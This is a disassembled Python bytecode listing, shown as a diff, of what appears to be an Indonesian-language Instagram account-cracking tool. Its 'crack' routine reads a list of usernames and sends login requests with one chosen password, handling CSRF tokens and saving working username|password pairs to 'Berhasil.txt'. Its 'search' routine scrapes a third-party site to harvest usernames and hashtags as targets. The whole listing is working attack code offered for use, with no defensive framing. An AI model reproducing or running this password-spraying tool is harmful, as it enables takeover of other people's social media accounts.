+                        350 LOAD_CONST              21 ('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                        353 CALL_FUNCTION            1
+                        356 POP_TOP             
+            
+            147         357 LOAD_GLOBAL             16 (menu)
+                        360 CALL_FUNCTION            0
+                        363 POP_TOP             
+                        364 LOAD_CONST               0 (None)
+                        367 RETURN_VALUE        
+            
+      28 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     150
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x02\r\x01\x05\x01\t\x01\x0c\x01\x0c\x01\x03\x01\x0f\x01\n\x01\r\x01\r\x01\x05\x01\n\x01\x0b\x01\x03\x01\x0f\x01\x12\x01\t\x01\x12\x01\x0f\x01\x1e\x01\x14\x01\x1b\x01\x1e\x01\t\x01\x12\x01\x12\x01\x04\x01\x0c\x01\x0f\x01\x19\x01\n\x01\x19\x01\r\x02\r\x01\n\x01B\x00\x15\x01\r\x01\x05\x01\x10\x01\x13\x01\x05\x01'
+         co_name:            'crack'
+         co_names:           ('os', 'system', 'logo', 'raw_input', 'open', 'jalan', 'IOError', 'menu', 'read', 'split', 'up', 'readline', 'strip', 'session', 'get', 'base', 'headers', 'update', 'cookies', 'post', 'url', 'True', 'json', 'loads', 'text', 'back', 'len', 'write', 'close', 'berhasil', 'append', 'gagal', 'sys', 'stdout', 'str', 'flush', 'time', 'sleep', 'requests', 'exceptions', 'ConnectionError', 'keluar')
+         co_nlocals:         11
+         co_stacksize:       6
+         co_varnames:        ('idlist', 'passw', 'file', 'buka', 'username', 'req', 'login_data', 'login', 'cookies', 'memek', 'bisa')
+         co_consts
+            0 None
+            1 'reset'
+            2 30
+            3 '\x1b[1;97m='
+            4 '\x1b[1;91m[+] \x1b[1;92mFile User \x1b[1;91m: \x1b[1;97m'
+            5 '\x1b[1;91m[+] \x1b[1;92mPassword  \x1b[1;91m: \x1b[1;97m'
+            6 'r'
+            7 '\x1b[1;91m[!] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...'
+            8 '\x1b[1;91m[!] File tidak ditemukan'
+            9 '\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]'
+            10 'csrftoken'
+            11 'X-CSRFToken'
+            12 'username'
+            13 'password'
+            14 'data'
+            15 'allow_redirects'
+            16 'userId'
+            17 'Berhasil.txt'
+            18 'w'
+            19 ' | '
+            20 '\n'
+            21 '    \x1b[32mUsername \x1b[1;97m: '
+            22 ' | \x1b[1;92mPassword \x1b[1;97m: '
+            23 1
+            24 '\r\x1b[1;91m[\x1b[1;96m%\x1b[1;91m] \x1b[1;92mCrack     \x1b[1;91m:\x1b[1;97m '
+            25 ' \x1b[1;96m>\x1b[1;97m '
+            26 ' =>\x1b[1;92mLive \x1b[1;91m:\x1b[1;96m '
+            27 '\n\x1b[1;91m[!] Koneksi terganggu'
+            28 '\x1b[1;91m[!] Tidak ada koneksi'
+         co_code
+            74 00 00 6a 01 00 64 01 00 83 01 00 01 74 02 00
+            47 48 64 02 00 64 03 00 14 47 48 74 03 00 64 04
+            00 83 01 00 7d 00 00 74 03 00 64 05 00 83 01 00
+            7d 01 00 79 26 00 74 04 00 7c 00 00 64 06 00 83
+            02 00 7d 02 00 74 05 00 64 07 00 83 01 00 01 64
+            02 00 64 03 00 14 47 48 57 6e 27 00 04 74 06 00
+            6b 0a 00 72 82 00 01 01 01 64 08 00 47 48 74 03
+            00 64 09 00 83 01 00 01 74 07 00 83 00 00 01 6e
+            01 00 58 79 b9 01 74 04 00 7c 00 00 64 06 00 83
+            02 00 7d 03 00 7c 03 00 6a 08 00 83 00 00 6a 09
+            00 83 00 00 61 0a 00 78 91 01 7c 02 00 72 3a 02
+            7c 02 00 6a 0b 00 83 00 00 6a 0c 00 83 00 00 7d
+            04 00 74 0d 00 6a 0e 00 74 0f 00 83 01 00 7d 05
+            00 74 0d 00 6a 10 00 6a 11 00 69 01 00 7c 05 00
+            6a 12 00 64 0a 00 19 64 0b 00 36 83 01 00 01 69
+            02 00 7c 04 00 64 0c 00 36 7c 01 00 64 0d 00 36
+            7d 06 00 74 0d 00 6a 13 00 74 14 00 64 0e 00 7c
+            06 00 64 0f 00 74 15 00 83 01 02 7d 07 00 74 0d
+            00 6a 10 00 6a 11 00 69 01 00 7c 07 00 6a 12 00
+            64 0a 00 19 64 0b 00 36 83 01 00 01 7c 07 00 6a
+            12 00 7d 08 00 74 16 00 6a 17 00 7c 07 00 6a 18
+            00 83 01 00 7d 09 00 74 19 00 74 1a 00 74 0a 00
+            83 01 00 6b 02 00 72 6d 01 50 6e 7b 00 64 10 00
+            7c 09 00 6b 06 00 72 d1 01 74 04 00 64 11 00 64
+            12 00 83 02 00 7d 0a 00 7c 0a 00 6a 1b 00 7c 04
+            00 64 13 00 17 7c 01 00 17 64 14 00 17 83 01 00
+            01 7c 0a 00 6a 1c 00 83 00 00 01 74 1d 00 6a 1e
+            00 64 15 00 7c 04 00 17 64 16 00 17 7c 01 00 17
+            83 01 00 01 74 19 00 64 17 00 37 61 19 00 6e 17
+            00 74 1f 00 6a 1e 00 7c 04 00 83 01 00 01 74 19
+            00 64 17 00 37 61 19 00 74 20 00 6a 21 00 6a 1b
+            00 64 18 00 74 22 00 74 19 00 83 01 00 17 64 19
+            00 17 74 22 00 74 1a 00 74 0a 00 83 01 00 83 01
+            00 17 64 1a 00 17 74 22 00 74 1a 00 74 1d 00 83
+            01 00 83 01 00 17 83 01 00 01 74 20 00 6a 21 00
+            6a 23 00 83 00 00 01 71 aa 00 57 57 6e 45 00 04
+            74 06 00 6b 0a 00 72 61 02 01 01 01 64 1b 00 47
+            48 74 24 00 6a 25 00 64 17 00 83 01 00 01 6e 23
+            00 04 74 26 00 6a 27 00 6a 28 00 6b 0a 00 72 83
+            02 01 01 01 64 1c 00 47 48 74 29 00 83 00 00 01
+            6e 01 00 58 64 00 00 53
+            disassembled:
+            152           0 LOAD_GLOBAL              0 (os)
+                          3 LOAD_ATTR                1 (system)
+                          6 LOAD_CONST               1 ('reset')
+                          9 CALL_FUNCTION            1
+                         12 POP_TOP             
+            
+            153          13 LOAD_GLOBAL              2 (logo)
+                         16 PRINT_ITEM          
+                         17 PRINT_NEWLINE       
+            
+            154          18 LOAD_CONST               2 (30)
+                         21 LOAD_CONST               3 ('\x1b[1;97m=')
+                         24 BINARY_MULTIPLY     
+                         25 PRINT_ITEM          
+                         26 PRINT_NEWLINE       
+            
+            155          27 LOAD_GLOBAL              3 (raw_input)
+                         30 LOAD_CONST               4 ('\x1b[1;91m[+] \x1b[1;92mFile User \x1b[1;91m: \x1b[1;97m')
+                         33 CALL_FUNCTION            1
+                         36 STORE_FAST               0 (idlist)
+            
+            156          39 LOAD_GLOBAL              3 (raw_input)
+                         42 LOAD_CONST               5 ('\x1b[1;91m[+] \x1b[1;92mPassword  \x1b[1;91m: \x1b[1;97m')
+                         45 CALL_FUNCTION            1
+                         48 STORE_FAST               1 (passw)
+            
+            157          51 SETUP_EXCEPT            38 (to 92)
+            
+            158          54 LOAD_GLOBAL              4 (open)
+                         57 LOAD_FAST                0 (idlist)
+                         60 LOAD_CONST               6 ('r')
+                         63 CALL_FUNCTION            2
+                         66 STORE_FAST               2 (file)
+            
+            159          69 LOAD_GLOBAL              5 (jalan)
+                         72 LOAD_CONST               7 ('\x1b[1;91m[!] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...')
+                         75 CALL_FUNCTION            1
+                         78 POP_TOP             
+            
+            160          79 LOAD_CONST               2 (30)
+                         82 LOAD_CONST               3 ('\x1b[1;97m=')
+                         85 BINARY_MULTIPLY     
+                         86 PRINT_ITEM          
+                         87 PRINT_NEWLINE       
+                         88 POP_BLOCK           
+                         89 JUMP_FORWARD            39 (to 131)
+            
+            161     >>   92 DUP_TOP             
+                         93 LOAD_GLOBAL              6 (IOError)
+                         96 COMPARE_OP              10 (exception match)
+                         99 POP_JUMP_IF_FALSE      130
+                        102 POP_TOP             
+                        103 POP_TOP             
+                        104 POP_TOP             
+            
+            162         105 LOAD_CONST               8 ('\x1b[1;91m[!] File tidak ditemukan')
+                        108 PRINT_ITEM          
+                        109 PRINT_NEWLINE       
+            
+            163         110 LOAD_GLOBAL              3 (raw_input)
+                        113 LOAD_CONST               9 ('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                        116 CALL_FUNCTION            1
+                        119 POP_TOP             
+            
+            164         120 LOAD_GLOBAL              7 (menu)
+                        123 CALL_FUNCTION            0
+                        126 POP_TOP             
+                        127 JUMP_FORWARD             1 (to 131)
+                    >>  130 END_FINALLY         
+            
+            165     >>  131 SETUP_EXCEPT           441 (to 575)
+            
+            166         134 LOAD_GLOBAL              4 (open)
+                        137 LOAD_FAST                0 (idlist)
+                        140 LOAD_CONST               6 ('r')
+                        143 CALL_FUNCTION            2
+                        146 STORE_FAST               3 (buka)
+            
+            167         149 LOAD_FAST                3 (buka)
+                        152 LOAD_ATTR                8 (read)
+                        155 CALL_FUNCTION            0
+                        158 LOAD_ATTR                9 (split)
+                        161 CALL_FUNCTION            0
+                        164 STORE_GLOBAL            10 (up)
+            
+            168         167 SETUP_LOOP             401 (to 571)
+                    >>  170 LOAD_FAST                2 (file)
+                        173 POP_JUMP_IF_FALSE      570
+            
+            169         176 LOAD_FAST                2 (file)
+                        179 LOAD_ATTR               11 (readline)
+                        182 CALL_FUNCTION            0
+                        185 LOAD_ATTR               12 (strip)
+                        188 CALL_FUNCTION            0
+                        191 STORE_FAST               4 (username)
+            
+            170         194 LOAD_GLOBAL             13 (session)
+                        197 LOAD_ATTR               14 (get)
+                        200 LOAD_GLOBAL             15 (base)
+                        203 CALL_FUNCTION            1
+                        206 STORE_FAST               5 (req)
+            
+            171         209 LOAD_GLOBAL             13 (session)
+                        212 LOAD_ATTR               16 (headers)
+                        215 LOAD_ATTR               17 (update)
+                        218 BUILD_MAP                1
+                        221 LOAD_FAST                5 (req)
+                        224 LOAD_ATTR               18 (cookies)
+                        227 LOAD_CONST              10 ('csrftoken')
+                        230 BINARY_SUBSCR       
+                        231 LOAD_CONST              11 ('X-CSRFToken')
+                        234 STORE_MAP           
+                        235 CALL_FUNCTION            1
+                        238 POP_TOP             
+            
+            172         239 BUILD_MAP                2
+                        242 LOAD_FAST                4 (username)
+                        245 LOAD_CONST              12 ('username')
+                        248 STORE_MAP           
+                        249 LOAD_FAST                1 (passw)
+                        252 LOAD_CONST              13 ('password')
+                        255 STORE_MAP           
+                        256 STORE_FAST               6 (login_data)
+            
+            173         259 LOAD_GLOBAL             13 (session)
+                        262 LOAD_ATTR               19 (post)
+                        265 LOAD_GLOBAL             20 (url)
+                        268 LOAD_CONST              14 ('data')
+                        271 LOAD_FAST                6 (login_data)
+                        274 LOAD_CONST              15 ('allow_redirects')
+                        277 LOAD_GLOBAL             21 (True)
+                        280 CALL_FUNCTION          513
+                        283 STORE_FAST               7 (login)
+            
+            174         286 LOAD_GLOBAL             13 (session)
+                        289 LOAD_ATTR               16 (headers)
+                        292 LOAD_ATTR               17 (update)
+                        295 BUILD_MAP                1
+                        298 LOAD_FAST                7 (login)
+                        301 LOAD_ATTR               18 (cookies)
+                        304 LOAD_CONST              10 ('csrftoken')
+                        307 BINARY_SUBSCR       
+                        308 LOAD_CONST              11 ('X-CSRFToken')
+                        311 STORE_MAP           
+                        312 CALL_FUNCTION            1
+                        315 POP_TOP             
+            
+            175         316 LOAD_FAST                7 (login)
+                        319 LOAD_ATTR               18 (cookies)
+                        322 STORE_FAST               8 (cookies)
+            
+            176         325 LOAD_GLOBAL             22 (json)
+                        328 LOAD_ATTR               23 (loads)
+                        331 LOAD_FAST                7 (login)
+                        334 LOAD_ATTR               24 (text)
+                        337 CALL_FUNCTION            1
+                        340 STORE_FAST               9 (memek)
+            
+            177         343 LOAD_GLOBAL             25 (back)
+                        346 LOAD_GLOBAL             26 (len)
+                        349 LOAD_GLOBAL             10 (up)
+                        352 CALL_FUNCTION            1
+                        355 COMPARE_OP               2 (==)
+                        358 POP_JUMP_IF_FALSE      365
+            
+            178         361 BREAK_LOOP          
+                        362 JUMP_FORWARD           123 (to 488)
+            
+            179     >>  365 LOAD_CONST              16 ('userId')
+                        368 LOAD_FAST                9 (memek)
+                        371 COMPARE_OP               6 (in)
+                        374 POP_JUMP_IF_FALSE      465
+            
+            180         377 LOAD_GLOBAL              4 (open)
+                        380 LOAD_CONST              17 ('Berhasil.txt')
+                        383 LOAD_CONST              18 ('w')
+                        386 CALL_FUNCTION            2
+                        389 STORE_FAST              10 (bisa)
+            
+            181         392 LOAD_FAST               10 (bisa)
+                        395 LOAD_ATTR               27 (write)
+                        398 LOAD_FAST                4 (username)
+                        401 LOAD_CONST              19 (' | ')
+                        404 BINARY_ADD          
+                        405 LOAD_FAST                1 (passw)
+                        408 BINARY_ADD          
+                        409 LOAD_CONST              20 ('\n')
+                        412 BINARY_ADD          
+                        413 CALL_FUNCTION            1
+                        416 POP_TOP             
+            
+            182         417 LOAD_FAST               10 (bisa)
+                        420 LOAD_ATTR               28 (close)
+                        423 CALL_FUNCTION            0
+                        426 POP_TOP             
+            
+            183         427 LOAD_GLOBAL             29 (berhasil)
+                        430 LOAD_ATTR               30 (append)
+                        433 LOAD_CONST              21 ('    \x1b[32mUsername \x1b[1;97m: ')
+                        436 LOAD_FAST                4 (username)
+                        439 BINARY_ADD          
+                        440 LOAD_CONST              22 (' | \x1b[1;92mPassword \x1b[1;97m: ')
+                        443 BINARY_ADD          
+                        444 LOAD_FAST                1 (passw)
+                        447 BINARY_ADD          
+                        448 CALL_FUNCTION            1
+                        451 POP_TOP             
+            
+            184         452 LOAD_GLOBAL             25 (back)
+                        455 LOAD_CONST              23 (1)
+                        458 INPLACE_ADD         
+                        459 STORE_GLOBAL            25 (back)
+                        462 JUMP_FORWARD            23 (to 488)
+            
+            186     >>  465 LOAD_GLOBAL             31 (gagal)
+                        468 LOAD_ATTR               30 (append)
+                        471 LOAD_FAST                4 (username)
+                        474 CALL_FUNCTION            1
+                        477 POP_TOP             
+            
+            187         478 LOAD_GLOBAL             25 (back)
+                        481 LOAD_CONST              23 (1)
+                        484 INPLACE_ADD         
+                        485 STORE_GLOBAL            25 (back)
+            
+            188     >>  488 LOAD_GLOBAL             32 (sys)
+                        491 LOAD_ATTR               33 (stdout)
+                        494 LOAD_ATTR               27 (write)
+                        497 LOAD_CONST              24 ('\r\x1b[1;91m[\x1b[1;96m%\x1b[1;91m] \x1b[1;92mCrack     \x1b[1;91m:\x1b[1;97m ')
+                        500 LOAD_GLOBAL             34 (str)
+                        503 LOAD_GLOBAL             25 (back)
+                        506 CALL_FUNCTION            1
+                        509 BINARY_ADD          
+                        510 LOAD_CONST              25 (' \x1b[1;96m>\x1b[1;97m ')
+                        513 BINARY_ADD          
+                        514 LOAD_GLOBAL             34 (str)
+                        517 LOAD_GLOBAL             26 (len)
+                        520 LOAD_GLOBAL             10 (up)
+                        523 CALL_FUNCTION            1
+                        526 CALL_FUNCTION            1
+                        529 BINARY_ADD          
+                        530 LOAD_CONST              26 (' =>\x1b[1;92mLive \x1b[1;91m:\x1b[1;96m ')
+                        533 BINARY_ADD          
+                        534 LOAD_GLOBAL             34 (str)
+                        537 LOAD_GLOBAL             26 (len)
+                        540 LOAD_GLOBAL             29 (berhasil)
+                        543 CALL_FUNCTION            1
+                        546 CALL_FUNCTION            1
+                        549 BINARY_ADD          
+                        550 CALL_FUNCTION            1
+                        553 POP_TOP             
+                        554 LOAD_GLOBAL             32 (sys)
+                        557 LOAD_ATTR               33 (stdout)
+                        560 LOAD_ATTR               35 (flush)
+                        563 CALL_FUNCTION            0
+                        566 POP_TOP             
+                        567 JUMP_ABSOLUTE          170
+                    >>  570 POP_BLOCK           
+                    >>  571 POP_BLOCK           
+                        572 JUMP_FORWARD            69 (to 644)
+            
+            189     >>  575 DUP_TOP             
+                        576 LOAD_GLOBAL              6 (IOError)
+                        579 COMPARE_OP              10 (exception match)
+                        582 POP_JUMP_IF_FALSE      609
+                        585 POP_TOP             
+                        586 POP_TOP             
+                        587 POP_TOP             
+            
+            190         588 LOAD_CONST              27 ('\n\x1b[1;91m[!] Koneksi terganggu')
+                        591 PRINT_ITEM          
+                        592 PRINT_NEWLINE       
+            
+            191         593 LOAD_GLOBAL             36 (time)
+                        596 LOAD_ATTR               37 (sleep)
+                        599 LOAD_CONST              23 (1)
+                        602 CALL_FUNCTION            1
+                        605 POP_TOP             
+                        606 JUMP_FORWARD            35 (to 644)
+            
+            192     >>  609 DUP_TOP             
+                        610 LOAD_GLOBAL             38 (requests)
+                        613 LOAD_ATTR               39 (exceptions)
+                        616 LOAD_ATTR               40 (ConnectionError)
+                        619 COMPARE_OP              10 (exception match)
+                        622 POP_JUMP_IF_FALSE      643
+                        625 POP_TOP             
+                        626 POP_TOP             
+                        627 POP_TOP             
+            
+            193         628 LOAD_CONST              28 ('\x1b[1;91m[!] Tidak ada koneksi')
+                        631 PRINT_ITEM          
+                        632 PRINT_NEWLINE       
+            
+            194         633 LOAD_GLOBAL             41 (keluar)
+                        636 CALL_FUNCTION            0
+                        639 POP_TOP             
+                        640 JUMP_FORWARD             1 (to 644)
+                    >>  643 END_FINALLY         
+                    >>  644 LOAD_CONST               0 (None)
+                        647 RETURN_VALUE        
+            
+      29 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     196
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\x01\x01\t\x02\x15\x01\r\x01\t\x02\x15\x01\x01\x01'
+         co_name:            'hasil'
+         co_names:           ('str', 'len', 'berhasil', 'gagal', 'keluar')
+         co_nlocals:         1
+         co_stacksize:       4
+         co_varnames:        ('b',)
+         co_consts
+            0 None
+            1 30
+            2 '\x1b[1;97m='
+            3 '\x1b[32m[\x1b[31m+\x1b[32m] \x1b[1;92mBerhasil \x1b[1;97m--> '
+            4 '\x1b[31m[+] Gagal    \x1b[1;97m--> '
+         co_code
+            48 64 01 00 64 02 00 14 47 48 64 03 00 74 00 00
+            74 01 00 74 02 00 83 01 00 83 01 00 17 47 48 78
+            13 00 74 02 00 44 5d 0b 00 7d 00 00 7c 00 00 47
+            48 71 26 00 57 64 04 00 74 00 00 74 01 00 74 03
+            00 83 01 00 83 01 00 17 47 48 48 74 04 00 83 00
+            00 01 64 00 00 53
+            disassembled:
+            197           0 PRINT_NEWLINE       
+            
+            198           1 LOAD_CONST               1 (30)
+                          4 LOAD_CONST               2 ('\x1b[1;97m=')
+                          7 BINARY_MULTIPLY     
+                          8 PRINT_ITEM          
+                          9 PRINT_NEWLINE       
+            
+            200          10 LOAD_CONST               3 ('\x1b[32m[\x1b[31m+\x1b[32m] \x1b[1;92mBerhasil \x1b[1;97m--> ')
+                         13 LOAD_GLOBAL              0 (str)
+                         16 LOAD_GLOBAL              1 (len)
+                         19 LOAD_GLOBAL              2 (berhasil)
+                         22 CALL_FUNCTION            1
+                         25 CALL_FUNCTION            1
+                         28 BINARY_ADD          
+                         29 PRINT_ITEM          
+                         30 PRINT_NEWLINE       
+            
+            201          31 SETUP_LOOP              19 (to 53)
+                         34 LOAD_GLOBAL              2 (berhasil)
+                         37 GET_ITER            
+                    >>   38 FOR_ITER                11 (to 52)
+                         41 STORE_FAST               0 (b)
+            
+            202          44 LOAD_FAST                0 (b)
+                         47 PRINT_ITEM          
+                         48 PRINT_NEWLINE       
+                         49 JUMP_ABSOLUTE           38
+                    >>   52 POP_BLOCK           
+            
+            204     >>   53 LOAD_CONST               4 ('\x1b[31m[+] Gagal    \x1b[1;97m--> ')
+                         56 LOAD_GLOBAL              0 (str)
+                         59 LOAD_GLOBAL              1 (len)
+                         62 LOAD_GLOBAL              3 (gagal)
+                         65 CALL_FUNCTION            1
+                         68 CALL_FUNCTION            1
+                         71 BINARY_ADD          
+                         72 PRINT_ITEM          
+                         73 PRINT_NEWLINE       
+            
+            205          74 PRINT_NEWLINE       
+            
+            206          75 LOAD_GLOBAL              4 (keluar)
+                         78 CALL_FUNCTION            0
+                         81 POP_TOP             
+                         82 LOAD_CONST               0 (None)
+                         85 RETURN_VALUE        
+            
+      30 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     209
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\r\x01\x05\x01\t\x01\x03\x01\x0c\x01\x0c\x01\x0f\x01\x06\x01\n\x01\t\x01\n\x01\x0c\x01\x0c\x01\n\x01\x0f\x01\x19\x01\r\x01\x19\x01\r\x01\x0c\x01\t\x01\x06\x01\x10\x02\t\x01\x06\x01\x11\x01\x15\x01\r\x01\x05\x01\n\x01\x0b\x01)\x01\t\x01\n\x01\n\x01'
+         co_name:            'search'
+         co_names:           ('os', 'system', 'logo', 'raw_input', 'open', 'jalan', 'buka', 'read', 'close', 'soup', 'findAll', 'text', 'has', 'append', 'write', 'name', 'IOError', 'menu', 'str', 'len')
+         co_nlocals:         14
+         co_stacksize:       6
+         co_varnames:        ('cari', 'simpan', 'sim', 'key', 'url', 'selesai', 'page_html', 'page_soup', 'contolatos', 'mek', 'username', 'user', 'tag', 'id')
+         co_consts
+            0 None
+            1 'reset'
+            2 30
+            3 '\x1b[1;97m='
+            4 '\x1b[1;91m[+] \x1b[1;92mCari user \x1b[1;91m: \x1b[1;97m'
+            5 '\x1b[1;91m[+] \x1b[1;92mSimpan file \x1b[1;97m(user.txt) \x1b[1;91m: \x1b[1;97m'
+            6 'w'
+            7 '\x1b[1;91m[+] \x1b[1;92mTunggu sebentar \x1b[1;97m...'
+            8 'https://web.stagram.com/search/?query='
+            9 'html.parser'
+            10 'div'
+            11 'card-block text-center'
+            12 'class'
+            13 'h4'
+            14 'card-title text-truncate'
+            15 0
+            16 '#'
+            17 '\x1b[1;91m[+] \x1b[1;92mHastag\x1b[1;91m :\x1b[1;93m '
+            18 '\x1b[1;91m[+] \x1b[1;92mUser\x1b[1;91m   :\x1b[1;97m @'
+            19 '\n'
+            20 '\x1b[1;91m[!] Error'
+            21 '\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]'
+            22 '\n\r\x1b[1;91m[?] \x1b[1;97mJumlah    \x1b[1;91m: \x1b[1;97musr/\x1b[1;96m'
+            23 ' \x1b[1;97mtag/\x1b[1;96m'
+            24 '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m '
+         co_code
+            74 00 00 6a 01 00 64 01 00 83 01 00 01 74 02 00
+            47 48 64 02 00 64 03 00 14 47 48 79 27 01 74 03
+            00 64 04 00 83 01 00 7d 00 00 74 03 00 64 05 00
+            83 01 00 7d 01 00 74 04 00 7c 01 00 64 06 00 83
+            02 00 7d 02 00 7c 00 00 7d 03 00 74 05 00 64 07
+            00 83 01 00 01 64 02 00 64 03 00 14 47 48 64 08
+            00 7c 03 00 17 7d 04 00 74 06 00 7c 04 00 83 01
+            00 7d 05 00 7c 05 00 6a 07 00 83 00 00 7d 06 00
+            7c 05 00 6a 08 00 83 00 00 01 74 09 00 7c 06 00
+            64 09 00 83 02 00 7d 07 00 7c 07 00 6a 0a 00 64
+            0a 00 69 01 00 64 0b 00 64 0c 00 36 83 02 00 7d
+            08 00 78 8c 00 7c 08 00 44 5d 84 00 7d 09 00 7c
+            09 00 6a 0a 00 64 0d 00 69 01 00 64 0e 00 64 0c
+            00 36 83 02 00 7d 0a 00 7c 0a 00 64 0f 00 19 6a
+            0b 00 7d 0b 00 64 10 00 7c 0b 00 6b 06 00 72 10
+            01 64 11 00 7c 0b 00 17 47 48 7c 0b 00 7d 0c 00
+            74 0c 00 6a 0d 00 7c 0c 00 83 01 00 01 71 b9 00
+            64 12 00 7c 0b 00 17 47 48 7c 0b 00 7d 0d 00 7c
+            02 00 6a 0e 00 7c 0d 00 64 13 00 17 83 01 00 01
+            74 0f 00 6a 0d 00 7c 0d 00 83 01 00 01 71 b9 00
+            57 57 6e 27 00 04 74 10 00 6b 0a 00 72 6b 01 01
+            01 01 64 14 00 47 48 74 03 00 64 15 00 83 01 00
+            01 74 11 00 83 00 00 01 6e 01 00 58 64 16 00 74
+            12 00 74 13 00 74 0f 00 83 01 00 83 01 00 17 64
+            17 00 17 74 12 00 74 13 00 74 0c 00 83 01 00 83
+            01 00 17 47 48 64 18 00 7c 01 00 17 47 48 7c 02
+            00 6a 08 00 83 00 00 01 74 03 00 64 15 00 83 01
+            00 01 74 11 00 83 00 00 01 64 00 00 53
+            disassembled:
+            210           0 LOAD_GLOBAL              0 (os)
+                          3 LOAD_ATTR                1 (system)
+                          6 LOAD_CONST               1 ('reset')
+                          9 CALL_FUNCTION            1
+                         12 POP_TOP             
+            
+            211          13 LOAD_GLOBAL              2 (logo)
+                         16 PRINT_ITEM          
+                         17 PRINT_NEWLINE       
+            
+            212          18 LOAD_CONST               2 (30)
+                         21 LOAD_CONST               3 ('\x1b[1;97m=')
+                         24 BINARY_MULTIPLY     
+                         25 PRINT_ITEM          
+                         26 PRINT_NEWLINE       
+            
+            213          27 SETUP_EXCEPT           295 (to 325)
+            
+            214          30 LOAD_GLOBAL              3 (raw_input)
+                         33 LOAD_CONST               4 ('\x1b[1;91m[+] \x1b[1;92mCari user \x1b[1;91m: \x1b[1;97m')
+                         36 CALL_FUNCTION            1
+                         39 STORE_FAST               0 (cari)
+            
+            215          42 LOAD_GLOBAL              3 (raw_input)
+                         45 LOAD_CONST               5 ('\x1b[1;91m[+] \x1b[1;92mSimpan file \x1b[1;97m(user.txt) \x1b[1;91m: \x1b[1;97m')
+                         48 CALL_FUNCTION            1
+                         51 STORE_FAST               1 (simpan)
+            
+            216          54 LOAD_GLOBAL              4 (open)
+                         57 LOAD_FAST                1 (simpan)
+                         60 LOAD_CONST               6 ('w')
+                         63 CALL_FUNCTION            2
+                         66 STORE_FAST               2 (sim)
+            
+            217          69 LOAD_FAST                0 (cari)
+                         72 STORE_FAST               3 (key)
+            
+            218          75 LOAD_GLOBAL              5 (jalan)
+                         78 LOAD_CONST               7 ('\x1b[1;91m[+] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+                         81 CALL_FUNCTION            1
+                         84 POP_TOP             
+            
+            219          85 LOAD_CONST               2 (30)
+                         88 LOAD_CONST               3 ('\x1b[1;97m=')
+                         91 BINARY_MULTIPLY     
+                         92 PRINT_ITEM          
+                         93 PRINT_NEWLINE       
+            
+            220          94 LOAD_CONST               8 ('https://web.stagram.com/search/?query=')
+                         97 LOAD_FAST                3 (key)
+                        100 BINARY_ADD          
+                        101 STORE_FAST               4 (url)
+            
+            221         104 LOAD_GLOBAL              6 (buka)
+                        107 LOAD_FAST                4 (url)
+                        110 CALL_FUNCTION            1
+                        113 STORE_FAST               5 (selesai)
+            
+            222         116 LOAD_FAST                5 (selesai)
+                        119 LOAD_ATTR                7 (read)
+                        122 CALL_FUNCTION            0
+                        125 STORE_FAST               6 (page_html)
+            
+            223         128 LOAD_FAST                5 (selesai)
+                        131 LOAD_ATTR                8 (close)
+                        134 CALL_FUNCTION            0
+                        137 POP_TOP             
+            
+            224         138 LOAD_GLOBAL              9 (soup)
+                        141 LOAD_FAST                6 (page_html)
+                        144 LOAD_CONST               9 ('html.parser')
+                        147 CALL_FUNCTION            2
+                        150 STORE_FAST               7 (page_soup)
+            
+            225         153 LOAD_FAST                7 (page_soup)
+                        156 LOAD_ATTR               10 (findAll)
+                        159 LOAD_CONST              10 ('div')
+                        162 BUILD_MAP                1
+                        165 LOAD_CONST              11 ('card-block text-center')
+                        168 LOAD_CONST              12 ('class')
+                        171 STORE_MAP           
+                        172 CALL_FUNCTION            2
+                        175 STORE_FAST               8 (contolatos)
+            
+            226         178 SETUP_LOOP             140 (to 321)
+                        181 LOAD_FAST                8 (contolatos)
+                        184 GET_ITER            
+                    >>  185 FOR_ITER               132 (to 320)
+                        188 STORE_FAST               9 (mek)
+            
+            227         191 LOAD_FAST                9 (mek)
+                        194 LOAD_ATTR               10 (findAll)
+                        197 LOAD_CONST              13 ('h4')
+                        200 BUILD_MAP                1
+                        203 LOAD_CONST              14 ('card-title text-truncate')
+                        206 LOAD_CONST              12 ('class')
+                        209 STORE_MAP           
+                        210 CALL_FUNCTION            2
+                        213 STORE_FAST              10 (username)
+            
+            228         216 LOAD_FAST               10 (username)
+                        219 LOAD_CONST              15 (0)
+                        222 BINARY_SUBSCR       
+                        223 LOAD_ATTR               11 (text)
+                        226 STORE_FAST              11 (user)
+            
+            229         229 LOAD_CONST              16 ('#')
+                        232 LOAD_FAST               11 (user)
+                        235 COMPARE_OP               6 (in)
+                        238 POP_JUMP_IF_FALSE      272
+            
+            230         241 LOAD_CONST              17 ('\x1b[1;91m[+] \x1b[1;92mHastag\x1b[1;91m :\x1b[1;93m ')
+                        244 LOAD_FAST               11 (user)
+                        247 BINARY_ADD          
+                        248 PRINT_ITEM          
+                        249 PRINT_NEWLINE       
+            
+            231         250 LOAD_FAST               11 (user)
+                        253 STORE_FAST              12 (tag)
+            
+            232         256 LOAD_GLOBAL             12 (has)
+                        259 LOAD_ATTR               13 (append)
+                        262 LOAD_FAST               12 (tag)
+                        265 CALL_FUNCTION            1
+                        268 POP_TOP             
+                        269 JUMP_ABSOLUTE          185
+            
+            234     >>  272 LOAD_CONST              18 ('\x1b[1;91m[+] \x1b[1;92mUser\x1b[1;91m   :\x1b[1;97m @')
+                        275 LOAD_FAST               11 (user)
+                        278 BINARY_ADD          
+                        279 PRINT_ITEM          
+                        280 PRINT_NEWLINE       
+            
+            235         281 LOAD_FAST               11 (user)
+                        284 STORE_FAST              13 (id)
+            
